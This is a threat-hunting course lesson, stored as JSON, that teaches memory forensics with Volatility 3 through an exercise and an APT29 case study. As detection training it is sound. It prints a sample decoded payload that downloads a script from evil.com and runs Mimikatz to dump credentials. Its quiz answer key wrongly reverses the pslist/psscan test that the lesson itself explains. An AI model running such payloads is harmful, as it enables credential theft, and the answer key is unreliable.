{
  "lesson_id": "b9b55099-4940-4375-aab6-4b1728d7e657",
  "domain": "threat_hunting",
  "title": "Memory Forensics for Threat Hunting",
  "difficulty": 3,
  "order_index": 5,
  "prerequisites": [
    "th-001-fundamentals",
    "th-003-windows-event-logs"
  ],
  "concepts": [
    "Volatile memory acquisition and analysis",
    "Volatility framework for memory forensics",
    "Detecting fileless malware and memory-resident threats",
    "Process injection and code injection detection",
    "Hunting for rootkits and hidden processes",
    "Memory-based IOC extraction"
  ],
  "estimated_time": 55,
  "learning_objectives": [
    "Acquire volatile memory from live systems",
    "Use Volatility to analyze memory dumps",
    "Detect fileless malware in memory",
    "Identify process and DLL injection techniques",
    "Hunt for hidden processes and rootkits",
    "Extract IOCs from memory for threat intelligence"
  ],
  "post_assessment": [
    {
      "question": "Why is memory forensics critical for detecting modern threats?",
      "options": [
        "Memory forensics is faster than disk forensics",
        "Many modern threats are fileless and only exist in memory",
        "Memory forensics doesn't require specialized tools",
        "Memory is easier to analyze than disk"
      ],
      "correct_answer": 1,
      "difficulty": 2,
      "type": "multiple_choice",
      "question_id": "4e504fa6-c498-4c3c-91ae-973008762871",
      "explanation": "Explanation not provided."
    },
    {
      "question": "Which Volatility plugin detects process injection?",
      "options": [
        "pslist",
        "netscan",
        "malfind",
        "filescan"
      ],
      "correct_answer": 2,
      "difficulty": 2,
      "type": "multiple_choice",
      "question_id": "9899fa1f-9dd8-437c-add9-3ea75de53e48",
      "explanation": "Explanation not provided."
    },
    {
      "question": "What is a key indicator of a hidden/rootkit process in memory?",
      "options": [
        "High CPU usage",
        "Process appears in pslist but not psscan",
        "Large memory footprint",
        "Multiple threads"
      ],
      "correct_answer": 1,
      "difficulty": 3,
      "type": "multiple_choice",
      "question_id": "928f5b1d-df98-4911-82de-771ee338582e",
      "explanation": "Explanation not provided."
    }
  ],
  "jim_kwik_principles": [
    "active_learning",
    "memory_hooks",
    "connect_to_what_i_know",
    "minimum_effective_dose",
    "teach_like_im_10",
    "meta_learning",
    "reframe_limiting_beliefs",
    "gamify_it",
    "learning_sprint",
    "multiple_memory_pathways"
  ],
  "content_blocks": [
    {
      "type": "explanation",
      "content": {
        "text": "# Memory Forensics: Hunting the Invisible\n\n**Memory forensics** is the analysis of **volatile RAM** to detect threats that leave no trace on disk. Modern adversaries increasingly use **fileless malware**, **in-memory payloads**, and **process injection**—all of which are invisible to traditional disk-based forensics.\n\n## Why Memory Forensics Matters\n\n**The Evolution of Malware**:\n\n**2010s - Disk-Based Malware**:\n- Malware written to disk (.exe, .dll files)\n- Persistence via registry, scheduled tasks\n- Detectable by antivirus scanning files\n\n**2020s - Fileless Malware**:\n- Malware loaded directly into memory (PowerShell, reflective DLL injection)\n- No files written to disk\n- Bypasses traditional antivirus\n- **Only visible in RAM**\n\n**Real-World Statistics**:\n- **70% of attacks** in 2023 used fileless techniques (Ponemon Institute)\n- **10x harder to detect** than traditional malware\n- **Average detection time**: 191 days for fileless vs 24 days for file-based\n\n**Examples of Fileless Attacks**:\n- **Cobalt Strike beacons**: Injected into legitimate processes\n- **Mimikatz**: Runs in-memory to dump credentials\n- **PowerShell Empire**: Pure PowerShell, no disk artifacts\n- **LOLBins**: Living-off-the-land binaries (wmi.exe, mshta.exe)\n\n## What is Volatile Memory?\n\n**RAM (Random Access Memory)** contains:\n- **Running processes** and their code\n- **Loaded DLLs** (Dynamic Link Libraries)\n- **Network connections** (active and recent)\n- **Registry keys** (from SYSTEM, SOFTWARE hives)\n- **Encryption keys** and **passwords** in plaintext\n- **Command-line history**\n- **Clipboard contents**\n- **Malware payloads** that never touched disk\n\n**The Challenge**: RAM is **volatile**—it's erased when the system reboots or powers off.\n\n**The Hunter's Window**:\n```\n[Compromise] → [Malware in RAM] → [System Reboot] → [Evidence GONE]\n↑\n[MUST CAPTURE HERE]\n```bash\n\n## Memory Acquisition\n\n### When to Acquire Memory\n\n**Acquire memory when**:\n- ✅ Investigating active intrusion (live response)\n- ✅ Suspicious process running\n- ✅ Unknown network connection detected\n- ✅ System showing signs of compromise\n- ✅ Hunting for fileless malware\n\n**DO NOT reboot before capturing memory!**\n\n### Memory Acquisition Tools\n\n**1. FTK Imager** (Free, Windows)\n```\n1. Download FTK Imager from AccessData\n2. Run as Administrator\n3. File → Capture Memory\n4. Choose output location (external drive recommended)\n5. Includes page file: YES\n6. Output: memory.dmp + memory.dmp.ad1\n```\n\n**2. WinPmem** (Open-source, Windows)\n```powershell\n# Download from Velocidex GitHub\nwinpmem_mini_x64.exe -o memory.raw\n\n# Output: memory.raw (raw memory dump)\n```\n\n**3. LiME** (Linux Memory Extractor)\n```bash\n# Install\nsudo apt-get install lime-forensics-dkms\n\n# Capture memory\nsudo insmod /usr/lib/lime/lime-$(uname -r).ko \"path=/tmp/memory.lime format=lime\"\n```\n\n**4. DumpIt** (One-click, Windows)\n```\n1. Run DumpIt.exe as Administrator\n2. Press 'y' to confirm\n3. Output: HOSTNAME-TIMESTAMP.raw\n```\n\n**Best Practices**:\n- ✅ Capture to **external drive** (not the compromised system)\n- ✅ Document **acquisition time** and **system state**\n- ✅ Calculate **hash** of memory dump (integrity)\n- ✅ Acquire **pagefile.sys** (contains swapped-out memory)\n\n## Volatility: The Memory Analysis Framework\n\n**Volatility** is the industry-standard open-source framework for memory forensics.\n\n### Installing Volatility 3\n\n```bash\n# Install Volatility 3 (Python 3)\ngit clone https://github.com/volatilityfoundation/volatility3.git\ncd volatility3\npip3 install -r requirements.txt\n\n# Verify installation\npython3 vol.py -h\n```\n\n**Volatility 2 vs Volatility 3**:\n- **Vol2**: Requires profile (Windows version detection)\n- **Vol3**: Auto-detects OS, faster, Python 3\n- **Recommendation**: Use Vol3 for new investigations\n\n### Basic Volatility Workflow\n\n**Step 1: Identify OS**\n```bash\npython3 vol.py -f memory.dmp windows.info\n\n# Output:\n# Windows Version: Windows 10 x64\n# Kernel Base: 0xf80000000000\n# DTB: 0x1ad000\n```\n\n**Step 2: List Processes**\n```bash\npython3 vol.py -f memory.dmp windows.pslist\n\n# Output:\n# PID   PPID  Name                Offset    Threads\n# 4     0     System              0x8a0000  120\n# 500   4     smss.exe            0x8b0000  2\n# 600   500   csrss.exe           0x8c0000  10\n# ...\n```\n\n**Step 3: Hunt for Malicious Processes**\n```bash\n# Find suspicious processes\npython3 vol.py -f memory.dmp windows.malfind\n\n# Malfind detects:\n# - Injected code\n# - Unusual memory protections (RWX)\n# - Hidden DLLs\n```"
      }
    },
    {
      "type": "explanation",
      "content": {
        "text": "## Hunting for Fileless Malware\n\n### Technique 1: Process Injection Detection\n\n**What is Process Injection?**\nAttackers inject malicious code into legitimate processes (e.g., svchost.exe, explorer.exe) to:\n- Hide malware inside trusted processes\n- Inherit process privileges\n- Evade detection\n\n**Detection with Volatility: malfind**\n\n```bash\npython3 vol.py -f memory.dmp windows.malfind\n\n# Output:\n# Process: explorer.exe (PID: 1234)\n# Address: 0x7fff00000000\n# Protection: PAGE_EXECUTE_READWRITE (RWX) [SUSPICIOUS]\n# Hexdump:\n# 4d 5a 90 00 03 00 00 00  MZ......  (PE header - injected DLL)\n```\n\n**Red Flags**:\n- ✅ **RWX memory regions**: Read+Write+Execute (unusual, enables code injection)\n- ✅ **PE headers in memory**: MZ signature (executable code)\n- ✅ **Code in unexpected locations**: Heap, stack injections\n\n**Common Injection Techniques**:\n- **CreateRemoteThread**: Inject into remote process\n- **Reflective DLL Injection**: Load DLL without disk\n- **Process Hollowing**: Replace legitimate process memory\n- **Atom Bombing**: Use Windows Atom Table for injection\n\n### Technique 2: Hidden Process Detection\n\n**Rootkits hide processes** by unlinking them from process lists.\n\n**Detection Strategy**: Compare multiple process enumeration methods\n\n```bash\n# Method 1: Walk EPROCESS linked list (can be manipulated)\npython3 vol.py -f memory.dmp windows.pslist\n\n# Method 2: Scan physical memory for EPROCESS structures (harder to hide)\npython3 vol.py -f memory.dmp windows.psscan\n\n# Compare outputs:\n# If process appears in psscan but NOT in pslist = HIDDEN PROCESS (rootkit)\n```\n\n**Example**:\n```\npslist output:\nPID 100, 200, 300, 400, 500\n\npsscan output:\nPID 100, 200, 250, 300, 400, 500\n↑\nHIDDEN PROCESS (PID 250)\n```\n\n**Why it works**: `pslist` follows Windows structures (can be hooked), `psscan` scans raw memory (can't be hooked).\n\n### Technique 3: DLL Injection Detection\n\n**Malware injects malicious DLLs** into processes.\n\n```bash\n# List DLLs loaded by a process\npython3 vol.py -f memory.dmp windows.dlllist --pid 1234\n\n# Output:\n# explorer.exe (PID: 1234)\n# Base              Name               Path\n# 0x7fff00000000    evil.dll           NOT ON DISK [SUSPICIOUS]\n# 0x7ffe12340000    kernel32.dll       C:\\Windows\\System32\\kernel32.dll\n```\n\n**Red Flags**:\n- ✅ DLLs **not on disk** (reflective injection)\n- ✅ DLLs from **temp directories** (C:\\Users\\*\\AppData\\Local\\Temp)\n- ✅ DLLs with **random names** (a7f3d.dll)\n- ✅ **Unsigned DLLs** in signed processes\n\n### Technique 4: Network Connection Analysis\n\n**Active C2 connections in memory**:\n\n```bash\n# Show network connections\npython3 vol.py -f memory.dmp windows.netscan\n\n# Output:\n# PID   Process         Protocol  Local Addr        Remote Addr       State\n# 1234  explorer.exe    TCP       192.168.1.50:5432 198.51.100.20:443 ESTABLISHED\n```\n\n**Hunt for**:\n- ✅ **Unusual processes** with network connections (notepad.exe, calc.exe)\n- ✅ **Connections to suspicious IPs** (threat intel match)\n- ✅ **Non-standard ports** (not 80, 443, 22)\n- ✅ **External connections from system processes**\n\n### Technique 5: Command-Line Extraction\n\n**PowerShell-based attacks leave command history in memory**:\n\n```bash\n# Extract command-line arguments\npython3 vol.py -f memory.dmp windows.cmdline\n\n# Output:\n# powershell.exe PID 5678\n# CommandLine: powershell.exe -NoP -NonI -W Hidden -Enc JABlA...  (base64)\n```\n\n**Decode base64 PowerShell**:\n```bash\necho \"JABlA...\" | base64 -d\n\n# Output:\n# IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1')\n# [MALICIOUS POWERSHELL]\n```\n\n**Hunt for**:\n- ✅ `-EncodedCommand` (obfuscation)\n- ✅ `-WindowStyle Hidden` (stealth)\n- ✅ `IEX`, `DownloadString` (remote code execution)\n- ✅ `Invoke-Mimikatz`, `Invoke-Kerberoast` (attack tools)"
      }
    },
    {
      "type": "code_exercise",
      "content": {
        "text": "## Practical Memory Forensics Hunt\n\n### Scenario: Detecting Cobalt Strike Beacon\n\n**Setup**: You've captured memory from a suspected compromised workstation.\n\n**Step 1: Identify OS and System Info**\n```bash\npython3 vol.py -f workstation01.dmp windows.info\n\n# Outputs:\n# OS: Windows 10 x64 Build 19042\n# Acquisition Time: 2025-01-15 14:30:00 UTC\n```\n\n**Step 2: List All Processes**\n```bash\npython3 vol.py -f workstation01.dmp windows.pslist > pslist.txt\n\n# Review for suspicious processes:\n# - Unusual names (a7f3d.exe)\n# - Legitimate processes from wrong paths (svchost.exe from C:\\Temp)\n# - High memory usage\n```\n\n**Step 3: Check for Hidden Processes**\n```bash\n# Compare pslist vs psscan\npython3 vol.py -f workstation01.dmp windows.psscan > psscan.txt\n\ndiff pslist.txt psscan.txt\n\n# If psscan shows extra processes = hidden/rootkit\n```\n\n**Step 4: Hunt for Process Injection**\n```bash\npython3 vol.py -f workstation01.dmp windows.malfind\n\n# Output:\n# Process: rundll32.exe (PID: 2468)\n# Address: 0x2a0000000000\n# Protection: PAGE_EXECUTE_READWRITE\n# \n# Hexdump:\n# 4d 5a 90 00 03 00 00 00  MZ......\n# 50 45 00 00 4c 01 06 00  PE..L...\n# \n# [COBALT STRIKE BEACON DETECTED]\n```\n\n**Analysis**:\n- `rundll32.exe` is legitimate Windows process\n- **RWX memory** = executable code injected\n- **MZ/PE headers** = DLL injected into process\n- This is **Cobalt Strike beacon** reflectively injected\n\n**Step 5: Extract Network Connections**\n```bash\npython3 vol.py -f workstation01.dmp windows.netscan | grep rundll32\n\n# Output:\n# 2468  rundll32.exe  TCP  192.168.1.50:54321  198.51.100.20:443  ESTABLISHED\n```\n\n**Confirmation**:\n- `rundll32.exe` (injected beacon) connected to **198.51.100.20:443** (C2 server)\n- **Port 443 (HTTPS)** - encrypted C2 channel\n\n**Step 6: Dump Suspicious Process**\n```bash\n# Dump rundll32.exe memory for malware analysis\npython3 vol.py -f workstation01.dmp windows.memmap --pid 2468 --dump\n\n# Output: pid.2468.dmp\n# Send to malware analysis team for reverse engineering\n```\n\n**Step 7: Extract Strings for IOCs**\n```bash\n# Extract strings from suspicious process\nstrings pid.2468.dmp > rundll32_strings.txt\n\ngrep -E '(http|https|ftp)://' rundll32_strings.txt\n\n# Output:\n# https://198.51.100.20/login\n# https://malicious-c2.com/beacon\n# [C2 URLS EXTRACTED]\n```\n\n**Step 8: Check for Credential Dumping**\n```bash\n# Mimikatz detection\npython3 vol.py -f workstation01.dmp windows.malfind | grep -i mimikatz\n\n# Or check for LSASS access\npython3 vol.py -f workstation01.dmp windows.handles --pid 2468 | grep lsass\n```bash\n\n### Scenario: Hunting Fileless PowerShell Attack\n\n**Step 1: Find PowerShell Processes**\n```bash\npython3 vol.py -f workstation01.dmp windows.pslist | grep -i powershell\n\n# Output:\n# 5432  powershell.exe  Started: 2025-01-15 14:25:00\n```\n\n**Step 2: Extract PowerShell Command-Line**\n```bash\npython3 vol.py -f workstation01.dmp windows.cmdline | grep -A5 \"PID.*5432\"\n\n# Output:\n# powershell.exe PID 5432\n# CommandLine: powershell.exe -NoProfile -NonInteractive -WindowStyle Hidden \n#   -EncodedCommand SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAI...\n```\n\n**Step 3: Decode Base64 Command**\n```bash\necho \"SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAI...\" | base64 -d\n\n# Output:\n# IEX (New-Object Net.WebClient).DownloadString('http://evil.com/payload.ps1'); \n# Invoke-Mimikatz -DumpCreds\n```\n\n**Analysis**:\n- **IEX** = Invoke-Expression (runs remote script)\n- **DownloadString** = Downloads PowerShell script from internet\n- **Invoke-Mimikatz** = Credential dumping tool\n- **No files written to disk** (fileless attack)\n\n**Step 4: Extract PowerShell History**\n```bash\n# Find PowerShell console history in memory\nstrings workstation01.dmp | grep -E '(Get-|Set-|Invoke-)' | head -50\n\n# Output shows full command history:\n# Get-NetUser\n# Get-NetGroup \"Domain Admins\"\n# Invoke-Kerberoast\n# [ENUMERATION & ATTACK COMMANDS]\n```\n\n**Conclusion**: Complete attack visible in memory despite no disk artifacts."
      }
    },
    {
      "type": "real_world",
      "content": {
        "text": "## Real-World Case: Detecting APT29 Fileless Malware\n\n### Background\n\nIn 2021, a government agency detected **APT29 (Cozy Bear)** using memory forensics after endpoint detection failed. The malware was **100% fileless**.\n\n### The Investigation\n\n**Week 1: Initial Suspicion**\n\nSOC analyst noticed unusual network traffic:\n- High-privilege account accessing file server at 2 AM\n- No corresponding login event in Event Logs\n- Workstation showed no malware via antivirus scan\n\n**Week 2: Memory Acquisition**\n\nThreat hunter acquired memory from suspicious workstation:\n```bash\nwinpmem_mini_x64.exe -o workstation-HR-05.raw\n```\n\n**Week 2: Volatility Analysis**\n\n**Step 1: Process List**\n```bash\npython3 vol.py -f workstation-HR-05.raw windows.pslist\n\n# Nothing obviously suspicious\n# All processes looked legitimate\n```\n\n**Step 2: Malfind (Injection Detection)**\n```bash\npython3 vol.py -f workstation-HR-05.raw windows.malfind\n\n# FOUND:\n# Process: svchost.exe (PID: 3456)\n# Protection: PAGE_EXECUTE_READWRITE\n# Unusual code region with shellcode patterns\n```\n\n**Step 3: Memory Dump Analysis**\n```bash\n# Dump svchost.exe memory\npython3 vol.py -f workstation-HR-05.raw windows.memmap --pid 3456 --dump\n\n# Analyze with strings\nstrings pid.3456.dmp > svchost_strings.txt\n\ngrep -i \"http\" svchost_strings.txt\n# Output:\n# hxxps://cdn-cloudflare[.]net/api/v2/auth\n# hxxps://updates-microsoft[.]com/kb/patch\n```\n\n**Red Flags**:\n- **Typosquatting domains** (cloudflare vs cloud flare)\n- **Fake Microsoft update domains**\n- **These domains NOT in DNS logs** (direct IP connection, DNS cache poisoning)\n\n**Step 4: Network Connections**\n```bash\npython3 vol.py -f workstation-HR-05.raw windows.netscan | grep 3456\n\n# Output:\n# 3456  svchost.exe  TCP  10.50.1.75:49321  198.51.100.75:443  ESTABLISHED\n```\n\n**Correlation**:\n- `svchost.exe` PID 3456 = injected code\n- Connected to 198.51.100.75 (resolved from fake domain)\n- **APT29 C2 infrastructure confirmed** (threat intel match)\n\n### Attack Reconstruction\n\n**Phase 1: Initial Access**\n```\nDay 1, 08:00 - Spearphishing email with malicious attachment\nDay 1, 08:15 - User opened attachment (no file on disk, macro in memory)\nDay 1, 08:16 - PowerShell Empire stager downloaded (in-memory only)\n```\n\n**Phase 2: Persistence (Fileless)**\n```\nDay 1, 08:20 - WMI Event Subscription created (persistence without files)\nDay 1, 08:25 - Injected into svchost.exe (living-off-the-land)\nDay 1, 08:30 - C2 beacon established (HTTPS to fake Microsoft domain)\n```\n\n**Phase 3: Privilege Escalation**\n```\nDay 2, 14:00 - Mimikatz executed in-memory (no file)\nDay 2, 14:05 - Domain admin credentials harvested\nDay 2, 14:10 - Lateral movement to domain controller\n```\n\n**Phase 4: Data Staging**\n```\nDay 7, 02:00 - 500 MB of sensitive documents staged in memory\nDay 7, 02:30 - MEMORY FORENSICS CONDUCTED [DETECTED HERE]\n```bash\n\n### Why Traditional Detection Failed\n\n**Antivirus**: ❌ No files on disk to scan\n**EDR**: ⚠️ Detected injection but flagged as false positive\n**SIEM**: ⚠️ Saw network traffic but missed significance\n**Event Logs**: ❌ Minimal evidence (no process creation for malware)\n\n**Memory Forensics**: ✅ **Only method that found the malware**\n\n### Response\n\n**Immediate**:\n1. Isolated workstation from network\n2. Killed svchost.exe PID 3456 (beacon process)\n3. Removed WMI Event Subscription persistence\n4. Blocked C2 IPs at firewall\n\n**Investigation**:\n5. Imaged workstation for forensics\n6. Reset all domain credentials (assume compromise)\n7. Hunted for lateral movement to other systems\n8. Found 2 additional compromised workstations via same memory forensics\n\n**Hardening**:\n9. Deployed PowerShell constrained language mode\n10. Enabled WMI Event Subscription monitoring\n11. Implemented memory scanning on critical assets\n12. Created Volatility hunt playbook for incident response\n\n### IOCs Extracted from Memory\n\n**Network Indicators**:\n- Domain: cdn-cloudflare[.]net (typosquatting)\n- Domain: updates-microsoft[.]com (typosquatting)\n- C2 IP: 198.51.100.75\n- User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\n\n**Memory Artifacts**:\n- Injected shellcode pattern: 0x4d5a9000 (MZ header)\n- WMI Event Subscription: __EventFilter \"Updater\"\n- PowerShell commands in memory (base64 encoded)\n\n**TTPs**:\n- T1059.001 - PowerShell\n- T1055 - Process Injection\n- T1546.003 - WMI Event Subscription\n- T1027 - Obfuscated Files or Information\n- T1071.001 - Application Layer Protocol: Web\n\n### Lessons Learned\n\n**What Worked**:\n- ✅ Memory forensics caught 100% fileless attack\n- ✅ Volatility malfind detected injection\n- ✅ String extraction revealed C2 infrastructure\n\n**What to Improve**:\n- ⚠️ Need real-time memory scanning (not just post-incident)\n- ⚠️ EDR should have flagged svchost.exe injection as high severity\n- ⚠️ WMI Event Subscription creation should trigger alerts\n\n**Outcome**: Attack stopped before data exfiltration. IOCs shared with government ISAC."
      }
    },
    {
      "type": "memory_aid",
      "content": {
        "text": "## Memory Forensics Memory Aids\n\n### VIPER - Memory Forensics Workflow\n\n**V** - **V**olatile memory acquisition (capture before reboot!)\n**I** - **I**dentify OS and profile (windows.info)\n**P** - **P**rocess enumeration (pslist, psscan)\n**E** - **E**xtract artifacts (malfind, netscan, cmdline)\n**R** - **R**eport findings and IOCs\n\n### The 5 Ps of Memory Hunting\n\n**P**rocesses - Enumerate with pslist/psscan\n**P**rotections - Check for RWX (Read-Write-Execute)\n**P**ayloads - Look for MZ/PE headers (injected code)\n**P**orts - Network connections (netscan)\n**P**owerShell - Command-line history (cmdline)\n\n### Injection Red Flags: RWX-MZ\n\n**RWX** - Memory region with Read+Write+Execute (abnormal)\n**MZ** - DOS/PE header (0x4d5a = \"MZ\") in unexpected location\n\nIf you see **RWX + MZ** = **Code Injection**\n\n### Volatility Plugin Quick Reference\n\n**pslist** - List processes (can be fooled)\n**psscan** - Scan memory for processes (more thorough)\n**malfind** - Find injected code/hidden DLLs\n**netscan** - Network connections\n**cmdline** - Command-line arguments\n**dlllist** - DLLs loaded by process\n**handles** - Open handles (files, registry, processes)\n\n### Visual: Memory Forensics Hunting Flow\n\n```\n[Suspicious Activity] → [Acquire Memory] → [Volatility Analysis]\n↓                    ↓                     ↓\nUnusual network      FTK Imager/WinPmem    pslist/psscan\nHigh CPU                    ↓                     ↓\nUnknown process         memory.dmp         malfind (injection?)\n↓                     ↓\nHash & document     netscan (C2 traffic?)\n↓\n[Incident Response]\n```"
      }
    },
    {
      "type": "reflection",
      "content": {
        "text": "## Reflection Questions\n\n1. **Why do modern adversaries prefer fileless malware over traditional disk-based malware?**\n\n*Hint: Think about antivirus detection, forensic evidence, and persistence.*\n\n2. **If you had to choose between endpoint logs (Sysmon) and memory forensics for detecting advanced threats, which provides more visibility? Why?**\n\n*Consider: Sysmon logs what happens, memory shows what's running right now.*\n\n3. **In the APT29 case study, why did memory forensics succeed where antivirus and EDR failed?**\n\n*Fileless malware leaves no disk artifacts. Memory is the only place to find it.*\n\n4. **What's the difference between pslist and psscan? When would you see different results?**\n\n*pslist follows Windows structures (can be hooked), psscan scans raw memory (can't be manipulated by rootkits).*\n\n5. **How would you prioritize which systems to perform memory forensics on if you can only capture 10 out of 1,000 workstations?**\n\n*Crown jewels first, then systems with suspicious network traffic, high-privilege accounts, or unusual behavior.*\n\n6. **Why is it critical to acquire memory BEFORE rebooting a suspected compromised system?**\n\n*RAM is volatile—all evidence disappears on reboot. Malware often doesn't persist across reboots (fileless).*"
      }
    },
    {
      "type": "mindset_coach",
      "content": {
        "text": "## Mastering Memory Forensics\n\n### You've Unlocked Advanced Hunting Skills\n\nMemory forensics is **advanced** but **essential** for modern threat hunting. You now understand:\n\n✅ **Why memory matters**: 70% of attacks use fileless techniques\n✅ **Memory acquisition**: FTK Imager, WinPmem, DumpIt\n✅ **Volatility framework**: pslist, psscan, malfind, netscan\n✅ **Injection detection**: RWX memory, MZ headers, reflective DLLs\n✅ **Fileless malware**: PowerShell, Cobalt Strike, in-memory payloads\n✅ **Real-world hunting**: APT29 detection case study\n\n**You can now detect threats that are invisible to traditional tools.**\n\n### The Memory Hunter's Advantage\n\n**Traditional Tools See**:\n- Files on disk ✓\n- Registry persistence ✓\n- Scheduled tasks ✓\n\n**Memory Forensics Sees**:\n- Fileless malware ✓\n- Process injection ✓\n- In-memory credentials ✓\n- Active C2 beacons ✓\n- Hidden processes ✓\n- **Everything in RAM** ✓\n\n**Memory is the ground truth.** Disk can be wiped, logs can be deleted, but **memory doesn't lie** (at the moment of capture).\n\n### Building Memory Forensics into Your Hunt Program\n\n**Reactive (Incident Response)**:\n- Suspicious alert triggers → Acquire memory → Analyze with Volatility\n- Standard IR procedure: Memory first, then disk forensics\n\n**Proactive (Threat Hunting)**:\n- Weekly/monthly memory captures from critical assets\n- Baseline normal process lists\n- Hunt for injection patterns across enterprise\n\n**Automated**:\n- Deploy agents that scan memory for injection (EDR with memory scanning)\n- Alert on RWX regions, hidden processes\n- Continuous monitoring (expensive but effective)\n\n### Your Action Plan\n\n**This Week**:\n\n1. **Install Volatility 3**:\n```bash\ngit clone https://github.com/volatilityfoundation/volatility3.git\ncd volatility3 && pip3 install -r requirements.txt\n```\n\n2. **Practice on Sample Memory Dumps**:\n- Download samples from: https://github.com/volatilityfoundation/volatility/wiki/Memory-Samples\n- Run pslist, malfind, netscan\n- Document findings\n\n3. **Capture Memory from a Test System**:\n- Use FTK Imager or WinPmem\n- Analyze with Volatility\n- Build your confidence\n\n**This Month**:\n\n4. **Create Memory Forensics Playbook**:\n- When to acquire memory (suspicious process, unknown connection)\n- Step-by-step Volatility workflow\n- IOC extraction procedures\n\n5. **Integrate with Incident Response**:\n- Make memory acquisition standard IR step\n- Train IR team on basic Volatility\n- Document successful findings\n\n6. **Hunt for Fileless Malware**:\n- Capture memory from high-value targets\n- Run malfind, cmdline, netscan\n- Look for PowerShell-based attacks\n\n### Resources\n\n**Tools**:\n- **Volatility 3**: https://github.com/volatilityfoundation/volatility3\n- **Volatility Cheat Sheet**: https://downloads.volatilityfoundation.org/releases/2.4/CheatSheet_v2.4.pdf\n- **FTK Imager**: Free from AccessData\n- **WinPmem**: https://github.com/Velocidex/WinPmem\n\n**Learning**:\n- **The Art of Memory Forensics** (Book) - Comprehensive guide\n- **SANS FOR500**: Windows Forensics course (includes memory)\n- **Memory Forensics with Vol3**: https://blog.onfvp.com/\n\n**Practice**:\n- **DFIR CTF Challenges**: Memory forensics challenges\n- **Malware Traffic Analysis**: Sample memory dumps with malware\n- **Volatility Labs**: Hands-on practice environments\n\n### Remember\n\n**Memory forensics is your secret weapon** against advanced adversaries.\n\nWhen:\n- Antivirus finds nothing ✓\n- Endpoint logs show nothing ✓\n- Disk forensics finds nothing ✓\n\n**Memory forensics finds the truth.**\n\n### Next Lesson Preview\n\nIn **EDR for Threat Hunters**, we'll cover:\n- Endpoint Detection & Response platforms\n- EDR telemetry for hunting\n- Query languages (KQL, SPL, PromQL)\n- Hunting with CrowdStrike, Carbon Black, Microsoft Defender ATP\n\n**Memory shows what's there. EDR shows what's happening across your entire fleet.**\n\n**Keep hunting. The memory never forgets.** 🎯"
      }
    }
  ]
}